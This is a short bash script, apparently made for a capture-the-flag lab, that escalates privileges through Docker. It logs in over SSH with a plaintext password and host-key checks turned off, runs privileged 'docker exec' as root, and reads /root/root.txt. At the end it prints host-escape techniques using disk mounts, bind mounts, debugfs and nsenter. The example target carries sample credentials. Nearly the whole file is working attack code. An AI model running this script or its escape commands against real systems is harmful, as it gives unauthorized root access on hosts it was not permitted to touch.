#!/bin/bash
# docker-escape.sh - Privilege escalation via docker exec
# Usage: ./docker-escape.sh <user@host> <password> <container_id>

SSH_TARGET="$1"
PASS="$2"
CID="${3:-e6ff5b1cbc85}"

if [ -z "$SSH_TARGET" ] || [ -z "$PASS" ]; then
    echo "Usage: docker-escape.sh <user@host> <password> [container_id]"
    echo "Example: ./docker-escape.sh boris@10.129.234.47 beautiful1"
    exit 1
fi

do_ssh() {
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$SSH_TARGET" "$1" 2>/dev/null
}

echo "=== Docker Privilege Escalation ==="
echo "Container: $CID"

echo "[1] Check sudo permissions..."
do_ssh 'sudo -l 2>/dev/null' | grep -E "docker|NOPASSWD"

echo "[2] Find container ID..."
CID=$(do_ssh "sudo /snap/bin/docker ps -q 2>/dev/null || echo '$CID'" | head -1)
echo "Container: $CID"

echo "[3] Privileged exec as root..."
echo "Testing:"
do_ssh "python3 -c \"import os; os.system('sudo /snap/bin/docker exec -u root --privileged $CID id 2>&1')\"" | grep uid

echo "[4] Read root flag..."
do_ssh "python3 -c \"import os; os.system('sudo /snap/bin/docker exec -u root --privileged $CID cat /root/root.txt 2>&1')\"" 

echo ""
echo "[*] If root flag not found, try:"
echo "  - Mount host FS: docker exec -u root --privileged <cid> mount /dev/sda1 /mnt"
echo "  - Bind mount:    docker exec --privileged <cid> mount --bind / /mnt/host"
echo "  - debugfs:       docker exec --privileged <cid> debugfs /dev/sda1 -R 'cat /root/root.txt'"
echo "  - nsenter:       docker exec --privileged <cid> nsenter -t 1 -m cat /root/root.txt"
